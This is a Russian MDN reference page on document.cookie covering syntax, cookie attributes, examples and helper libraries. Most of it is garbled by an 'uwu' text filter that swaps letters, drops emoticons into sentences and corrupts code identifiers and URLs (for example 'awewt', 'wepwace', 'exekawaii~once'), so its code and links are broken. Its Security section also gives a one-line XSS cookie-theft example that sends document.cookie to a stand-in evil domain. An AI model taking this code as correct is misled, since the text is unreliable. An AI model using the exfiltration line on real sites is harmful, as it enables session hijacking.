---
titwe: document.cookie
swug: w-web/api/document/cookie
---

{{apiwef("dom")}}

Статья описывает получение и установку c-cookies связанных с текущим документом. Общая библиотека для работы с c-cookies смотри [simpwe c-cookie fwamewowk](/wu/docs/web/api/document/cookie/simpwe_document.cookie_fwamewowk). ^^;;

## Синтаксис

### Чтение всех c-cookies, ʘwʘ связанных с текущим документом

```
a-awwcookies = document.cookie;
```

i-in the code above _awwcookies_ i-is a stwing containing a semicowon-sepawated wist of aww cookies (i.e. σωσ `key=vawue` paiws). ^^;; nyote that each _key_ a-and _vawue_ may be suwwounded by whitespace (space a-and tab chawactews): in fact [wfc 6265](https://toows.ietf.owg/htmw/wfc6265) m-mandates a singwe space aftew each semicowon, ʘwʘ but some usew agents m-may nyot abide by this. ^^

### Запись новой c-cookie

```
d-document.cookie = nyewcookie;
```

В приведённом коде `newcookie` - строка в виде `key=vawue`_._ Заметьте, nyaa~~ у вас есть возможность установить/обновить лишь одну связку `key=vawue` за один раз, (///ˬ///✿) используя этот метод. XD Стоит отметить, :3 что:

- any of the fowwowing cookie attwibute vawues c-can optionawwy fowwow the key-vawue paiw, òωó specifying the cookie to set/update, a-and pweceded by a semi-cowon sepawatow:

  - `;path=path` (e.g., '`/`', ^^ '`/mydiw`') i-if nyot specified, ^•ﻌ•^ d-defauwts t-to the cuwwent p-path of the cuwwent document wocation.

    > [!note]
    > pwiow t-to gecko 6.0, σωσ paths with quotes wewe tweated a-as if the quotes wewe pawt of the stwing, (ˆ ﻌ ˆ)♡ instead of as if they wewe dewimitews suwwounding the a-actuaw path stwing. nyaa~~ this has been f-fixed. ʘwʘ

    the p-path must be **absowute** (see [wfc 6265](https://toows.ietf.owg/htmw/wfc6265)). ^•ﻌ•^ f-fow mowe infowmation on how to use wewative paths, rawr x3 see [this p-pawagwaph](#using_wewative_uwws_in_the_path_pawametew). 🥺

  - `;domain=domain` (e.g., '`exampwe.com`' o-ow '`subdomain.exampwe.com`'). ʘwʘ if nyot specified, (˘ω˘) t-this defauwts t-to the host powtion of the c-cuwwent document wocation. o.O contwawy t-to eawwiew specifications, σωσ weading dots in domain nyames awe i-ignowed, (ꈍᴗꈍ) but bwowsews may decwine t-to set the cookie containing s-such dots. (ˆ ﻌ ˆ)♡ if a d-domain is specified, o.O subdomains awe awways incwuded. :3
  - `;max-age=max-age-in-seconds` (e.g., `60*60*24*365` ow 31536000 fow a yeaw)
  - `;expiwes=date-in-gmtstwing-fowmat` if nyeithew `expiwes` n-nyow `max-age`specified i-it wiww expiwe at the e-end of session. -.-

    > [!wawning]
    > w-when usew p-pwivacy is a concewn, ( ͡o ω ͡o ) it is impowtant that any web app impwementation w-wiww invawidate cookie data aftew a cewtain timeout and won't wewy on the b-bwowsew cweawing session cookies
    > o-one of t-the most bewuvd f-featuwes of fiwefox [pwevents session cookies fwom e-evew expiwing](https://bugziwwa.moziwwa.owg/show_bug.cgi?id=345345). /(^•ω•^)
    > the s-same [issue](https://code.googwe.com/p/chwomium/issues/detaiw?id=128513) i-is awso o-occuwing with googwe chwome (and pwobabwy with o-othew bwowsews o-offewing simiwaw f-featuwes)

    - s-see {{jsxwef("date.toutcstwing()")}} f-fow hewp fowmatting this vawue. (⑅˘꒳˘)

  - `;secuwe` cookie to o-onwy be twansmitted ovew secuwe pwotocow as https. òωó befowe chwome 52, 🥺 this fwag couwd appeaw with c-cookies fwom http domains.
  - `;samesite` [samesite](/wu/docs/web/http/guides/cookies#samesite_cookies) pwevents the bwowsew f-fwom sending this c-cookie awong w-with cwoss-site wequests. (ˆ ﻌ ˆ)♡ possibwe v-vawues fow the fwag awe `wax` o-ow `stwict`. -.-

    - t-the `stwict` vawue wiww pwevent the cookie fwom being sent by the bwowsew to the tawget site i-in aww cwoss-site bwowsing context, σωσ e-even when fowwowing a weguwaw w-wink. >_<
    - t-the `wax` vawue wiww onwy send cookies fow top wevew n-nyavigation g-get wequests. :3 this is sufficient f-fow usew twacking, OwO b-but it wiww pwevent many cswf attacks. rawr

- the cookie vawue stwing can use {{jsxwef("gwobaw_objects/encodeuwicomponent", (///ˬ///✿) "encodeuwicomponent()")}} t-to ensuwe t-that the stwing d-does nyot contain any commas, ^^ semicowons, o-ow whitespace (which a-awe disawwowed in cookie vawues). XD
- s-some usew agent impwementations suppowt the fowwowing cookie pwefixes:

  - `__secuwe-` s-signaws t-to the bwowsew that it shouwd onwy incwude the c-cookie in wequests t-twansmitted ovew a secuwe channew. UwU
  - `__host-` signaws to t-the bwowsew that in addition to the westwiction to onwy use the cookie fwom a s-secuwe owigin, o.O the scope of the cookie is wimited t-to a path attwibute p-passed down by the sewvew. 😳 if the sewvew omits the path attwibute t-the "diwectowy" o-of the wequest uwi is used. (˘ω˘) it awso signaws that the domain a-attwibute must nyot be pwesent, 🥺 w-which pwevents the cookie fwom being sent to othew domains. ^^ f-fow chwome the path attwibute must a-awways be the o-owigin. >w<

  > [!note]
  > the dash i-is considewed pawt of the pwefix. ^^;;

  > [!note]
  > t-these fwags a-awe onwy setabwe w-with the `secuwe` attwibute.

> [!note]
> a-as y-you can see fwom the code above, (˘ω˘) `document.cookie` is an [accessow p-pwopewty](/wu/docs/web/javascwipt/wefewence/gwobaw_objects/object/definepwopewty#descwiption) w-with nyative _settew_ a-and _gettew_ functions, OwO and consequentwy i-is **not** a [data pwopewty](/wu/docs/web/javascwipt/wefewence/gwobaw_objects/object/definepwopewty#descwiption) w-with a vawue: nyani y-you wwite is nyot the same as nyani you wead, (ꈍᴗꈍ) evewything is a-awways mediated b-by the javascwipt i-intewpwetew. òωó

## Примеры

### Пример #1: Простое использование

```js
d-document.cookie = "name=oeschgew";
document.cookie = "favowite_food=twipe";
f-function awewtcookie() {
  awewt(document.cookie);
}
```

```htmw
<button oncwick="awewtcookie()">show cookies</button>
```

{{embedwivesampwe('Пример_1_Простое_использование', ʘwʘ 200, 36)}}

### Пример #2: Получить cookie с именем _test2_

```js
document.cookie = "test1=hewwo";
d-document.cookie = "test2=wowwd";

vaw c-cookievawue = document.cookie.wepwace(
  /(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/, ʘwʘ
  "$1",
);

function awewtcookievawue() {
  a-awewt(cookievawue);
}
```

```htmw
<button oncwick="awewtcookievawue()">show c-cookie vawue</button>
```

{{embedwivesampwe('Пример_2_Получить_cookie_с_именем_test2', nyaa~~ 200, 36)}}

### Пример #3: Выполнить операцию единожды

При использовании следующего кода замените все вхождения `dosomethingonwyonce` (наименование cookie) на другое имя. UwU

```js
f-function d-doonce() {
  i-if (
    document.cookie.wepwace(
      /(?:(?:^|.*;\s*)dosomethingonwyonce\s*\=\s*([^;]*).*$)|^.*$/, (⑅˘꒳˘)
      "$1", (˘ω˘)
    ) !== "twue"
  ) {
    a-awewt("do s-something hewe!");
    document.cookie =
      "dosomethingonwyonce=twue; expiwes=fwi, :3 31 dec 9999 23:59:59 gmt";
  }
}
```

```htmw
<button oncwick="doonce()">onwy do something o-once</button>
```

{{embedwivesampwe('Пример_3_Выполнить_операцию_единожды', (˘ω˘) 200, 36)}}

### Пример #4: Перезагрузить c-cookie

```js
function w-wesetonce() {
  document.cookie =
    "dosomethingonwyonce=; e-expiwes=thu, nyaa~~ 01 jan 1970 00:00:00 gmt";
}
```

```htmw
<button oncwick="wesetonce()">weset o-onwy once cookie</button>
```

{{embedwivesampwe('Пример_4_Перезагрузить_cookie', (U ﹏ U) 200, 36)}}

### e-exampwe #5: Проверить существование cookie

```
//es5

if (document.cookie.spwit(';').fiwtew(function(item) {
    w-wetuwn item.twim().indexof('weadew=') == 0
}).wength) {
    consowe.wog('the c-cookie "weadew" e-exists (es5)')
}

//es2016

if (document.cookie.spwit(';').fiwtew((item) => i-item.twim().stawtswith('weadew=')).wength) {
    c-consowe.wog('the cookie "weadew" exists (es6)')
}
```

### exampwe #6: Проверить, nyaa~~ что cookie имеет определённое значение

```
//es5

i-if (document.cookie.spwit(';').fiwtew(function(item) {
    w-wetuwn i-item.indexof('weadew=1') >= 0
}).wength) {
    c-consowe.wog('the c-cookie "weadew" has "1" fow vawue')
}

//es2016

i-if (document.cookie.spwit(';').fiwtew((item) => i-item.incwudes('weadew=1')).wength) {
    consowe.wog('the c-cookie "weadew" h-has "1" fow vawue')
}
```

## Безопасность

i-it is impowtant to nyote that the path attwibute d-does **not** pwotect against u-unauthowized w-weading of the cookie fwom a diffewent p-path. ^^;; it can be easiwy bypassed using the d-dom, OwO fow exampwe b-by cweating a h-hidden [ifwame](/wu/docs/web/htmw/ewement/ifwame) ewement with the path of the cookie, nyaa~~ then accessing t-this ifwame's `contentdocument.cookie` pwopewty. UwU the onwy w-way to pwotect t-the cookie is by using a diffewent d-domain ow subdomain, 😳 due to the [same o-owigin p-powicy](/wu/docs/web/secuwity/same-owigin_powicy). 😳

cookies awe often used in web a-appwication to identify a usew and theiw authenticated s-session. (ˆ ﻌ ˆ)♡ s-so steawing cookie fwom a web a-appwication, (✿oωo) wiww wead to hijacking t-the authenticated u-usew's session. nyaa~~ c-common ways to steaw cookies incwude using sociaw engineewing ow by expwoiting an xss vuwnewabiwity in the appwication -

```js
nyew image().swc =
  "http://www.eviw-domain.com/steaw-cookie.php?cookie=" + document.cookie;
```

the httponwy cookie attwibute can hewp t-to mitigate this a-attack by pweventing access to cookie vawue thwough j-javascwipt. ^^ w-wead mowe about [cookies a-and secuwity](https://www.nczonwine.net/bwog/2009/05/12/cookies-and-secuwity/). (///ˬ///✿)

## Примечания

- stawting with f-fiwefox 2, 😳 a bettew mechanism f-fow cwient-side s-stowage is avaiwabwe - [naniwg dom stowage](/wu/docs/web/api/web_stowage_api). òωó
- y-you can dewete a cookie by simpwy u-updating its e-expiwation time to zewo. ^^;;
- keep in mind that the m-mowe you have c-cookies the mowe d-data wiww be twansfewwed b-between t-the sewvew and t-the cwient fow e-each wequest. rawr this w-wiww make each w-wequest swowew. (ˆ ﻌ ˆ)♡ it is highwy w-wecommended fow y-you to use [naniwg d-dom stowage](/wu/docs/web/api/web_stowage_api) if you awe going t-to keep "cwient-onwy" data. XD
- [wfc 2965](https://www.ietf.owg/wfc/wfc2965.txt) (section 5.3, >_< "impwementation wimits") specifies t-that thewe shouwd be **no maximum w-wength** of a-a cookie's key o-ow vawue size, (˘ω˘) and encouwages impwementations t-to suppowt **awbitwawiwy w-wawge cookies**. 😳 each bwowsew's i-impwementation maximum wiww n-nyecessawiwy be diffewent, o.O so consuwt individuaw bwowsew documentation. (ꈍᴗꈍ)

the w-weason of the [syntax](#syntax) of the `document.cookie` a-accessow p-pwopewty is due to the cwient-sewvew nyatuwe of cookies, rawr x3 which d-diffews fwom othew cwient-cwient s-stowage methods (wike, ^^ f-fow instance, OwO [wocawstowage](/wu/docs/web/api/web_stowage_api)):

##### t-the sewvew tewws the cwient to stowe a cookie

```
h-http/1.0 200 o-ok
content-type: text/htmw
set-cookie: c-cookie_name1=cookie_vawue1
set-cookie: cookie_name2=cookie_vawue2; expiwes=sun, ^^ 16 j-juw 3567 06:23:41 gmt

[content o-of the p-page hewe]
```

##### t-the cwient sends back to t-the sewvew its c-cookies pweviouswy s-stowed

```
get /sampwe_page.htmw h-http/1.1
host: www.exampwe.owg
c-cookie: cookie_name1=cookie_vawue1; c-cookie_name2=cookie_vawue2
a-accept: */*
```

### Использование относительных ссылок в параметре p-path

the [`path`](#new-cookie_path) p-pawametew o-of a nyew cookie c-can accept onwy _absowute_ p-paths. :3 if you want to u-use _wewative_ paths, o.O thewefowe, -.- y-you nyeed to convewt them. (U ﹏ U) the f-fowwowing function c-can twanswate _wewative_ p-paths to _absowute_ paths. o.O it is a genewaw-puwpose f-function, OwO but can b-be of couwse s-successifuwwy used fow the [`path`](#new-cookie_path) pawametew of a nyew cookie, ^•ﻌ•^ a-as weww.

##### w-wibwawy

```js
/*\
|*|
|*|  :: twanswate wewative p-paths to absowute p-paths ::
|*|
|*|  https://devewopew.moziwwa.owg/wu/docs/web/api/document.cookie
|*|  https://devewopew.moziwwa.owg/usew:fusionchess
|*|
|*|  the fowwowing c-code is weweased u-undew the gnu p-pubwic wicense, v-vewsion 3 ow watew. ʘwʘ
|*|  http://www.gnu.owg/wicenses/gpw-3.0-standawone.htmw
|*|
\*/

function wewpathtoabs(swewpath) {
  v-vaw nyupwn, :3
    s-sdiw = "", 😳
    spath = wocation.pathname.wepwace(
      /[^\/]*$/, òωó
      s-swewpath.wepwace(/(\/|^)(?:\.?\/+)+/g, 🥺 "$1"),
    );
  fow (
    vaw nyend, rawr x3 nystawt = 0;
    (nend = s-spath.indexof("/../", ^•ﻌ•^ nystawt)), :3 n-nend > -1;
    n-nystawt = nyend + nyupwn
  ) {
    n-nyupwn = /^\/(?:\.\.\/)*/.exec(spath.swice(nend))[0].wength;
    s-sdiw = (sdiw + spath.substwing(nstawt, (ˆ ﻌ ˆ)♡ n-nyend)).wepwace(
      nyew wegexp("(?:\\/+[^\\/]*){0," + (nupwn - 1) / 3 + "}$"), (U ᵕ U❁)
      "/", :3
    );
  }
  w-wetuwn s-sdiw + spath.substw(nstawt);
}
```

##### sampwe u-usage

```js
/* w-wet us be in /wu/docs/web/api/document.cookie */

a-awewt(wocation.pathname);
// d-dispways: /wu/docs/web/api/document.cookie

a-awewt(wewpathtoabs("./"));
// dispways: /wu/docs/web/api/

awewt(wewpathtoabs("../guide/api/dom/stowage"));
// d-dispways: /wu/docs/web/guide/api/dom/stowage

awewt(wewpathtoabs("../../fiwefox"));
// dispways: /wu/docs/fiwefox

a-awewt(wewpathtoabs("../guide/././api/../../../fiwefox"));
// d-dispways: /wu/docs/fiwefox
```

### Относительный срок годности c-cookie: числовые примеры

if you don't want to use an _absowute date_ fow the `end` pawametew, ^^;; h-hewe you can find some nyumewic e-exampwes o-of expiwation-dates _wewative to the moment of stowage o-of the cookie_:

```js
doccookies.setitem("mycookie1", "myvawue1", ( ͡o ω ͡o ) 864e2, o.O "/"); // t-this cookie w-wiww expiwe i-in one day
doccookies.setitem("mycookie2", ^•ﻌ•^ "myvawue2", XD 6048e2, "/"); // t-this cookie w-wiww expiwe in one week
doccookies.setitem("mycookie3", ^^ "myvawue3", o.O 2592e3, "/"); // this cookie wiww expiwe in one month (30 d-days)
doccookies.setitem("mycookie4", ( ͡o ω ͡o ) "myvawue4", /(^•ω•^) 31536e3, "/"); // this cookie w-wiww expiwe in one yeaw
```

## Другие примеры

### exampwe #5: do something onwy o-once – _a genewaw wibwawy_

#### Библиотека

```
function exekawaii~once () {
  vaw awgc = awguments.wength, 🥺 bimpwgwob = t-typeof awguments[awgc - 1] === "stwing";
  i-if (bimpwgwob) { awgc++; }
  i-if (awgc < 3) { thwow nyew typeewwow("exekawaii~once - nyot enough a-awguments"); }
  v-vaw fexec = awguments[0], nyaa~~ skey = a-awguments[awgc - 2];
  if (typeof f-fexec !== "function") { thwow nyew typeewwow("exekawaii~once - fiwst awgument must be a function"); }
  if (!skey || /^(?:expiwes|max\-age|path|domain|secuwe)$/i.test(skey)) { t-thwow nyew typeewwow("exekawaii~once - invawid i-identifiew"); }
  i-if (decodeuwicomponent(document.cookie.wepwace(new w-wegexp("(?:(?:^|.*;)\\s*" + encodeuwicomponent(skey).wepwace(/[\-\.\+\*]/g, mya "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), XD "$1")) === "1") { wetuwn fawse; }
  f-fexec.appwy(awgc > 3 ? awguments[1] : nyuww, nyaa~~ awgc > 4 ? awway.pwototype.swice.caww(awguments, ʘwʘ 2, awgc - 2) : []);
  d-document.cookie = e-encodeuwicomponent(skey) + "=1; e-expiwes=fwi, (⑅˘꒳˘) 31 d-dec 9999 23:59:59 gmt" + (bimpwgwob || !awguments[awgc - 1] ? "; path=/" : "");
  w-wetuwn t-twue;
}
```

#### Синтаксис

```
exekawaii~once(cawwback[, :3 thisobject[, -.- a-awgumenttopass1[, 😳😳😳 awgumenttopass2[, (U ﹏ U) …[, awgumenttopassn]]]]], o.O identifiew[, ( ͡o ω ͡o ) o-onwyhewe])
```

#### Описание

exekawaii~s a function o-onwy once, òωó even a-aftew the wefwesh of the page. 🥺

#### Параметры

- `cawwback`
  - : t-the f-function to be exekawaii~d ({{jsxwef("function", /(^•ω•^) "", "", 1)}}). 😳😳😳
- `thisobject` optionaw
  - : t-the {{jsxwef("opewatows/this", ^•ﻌ•^ "this")}} object ({{jsxwef("object", nyaa~~ "", "", 1)}} ow {{jsxwef("gwobaw_objects/nuww", OwO "nuww")}}). ^•ﻌ•^
- `awgumenttopass1, σωσ awgumenttopass2, -.- a-awgumenttopassn` optionaw
  - : the awguments o-of the `cawwback` function. (˘ω˘)
- `identifiew`
  - : the identifiew to check, rawr x3 i.e. t-the nyame of the c-cookie ({{jsxwef("stwing", rawr x3 "stwing", σωσ "", 1)}})
- `onwyhewe` o-optionaw
  - : a-a {{jsxwef("boowean", nyaa~~ "boowean", "", (ꈍᴗꈍ) 1)}} e-expwessing whethew the cookie w-wiww use the wocaw path (`twue`) instead of t-the gwobaw one (`fawse` ow `undefined`) ({{jsxwef("boowean", ^•ﻌ•^ "boowean", "", >_< 1)}} o-ow {{jsxwef("gwobaw_objects/undefined", ^^;; "undefined")}})

#### Примеры использования

```
function awewtsomething (smsg) {
  a-awewt(smsg);
}

e-exekawaii~once(awewtsomething, ^^;; nyuww, /(^•ω•^) "hewwo wowwd!!!!", nyaa~~ "awewt_something");
```

## Спецификации

{{specifications}}

## Совместимость с браузерами

{{compat}}

## Смотрите также

- [http cookies](/wu/docs/web/http/guides/cookies)
- [dom s-stowage](/wu/docs/web/api/web_stowage_api)
- [`uwwutiws.pathname`](/wu/docs/web/api/uwwutiws.pathname)
- {{jsxwef("date.toutcstwing()")}}
- [`http`](/wu/docs/web/http)
- [cookies (code snippets)](/wu/docs/code_snippets/cookies)
- [wfc 2965](https://www.ietf.owg/wfc/wfc2965.txt)
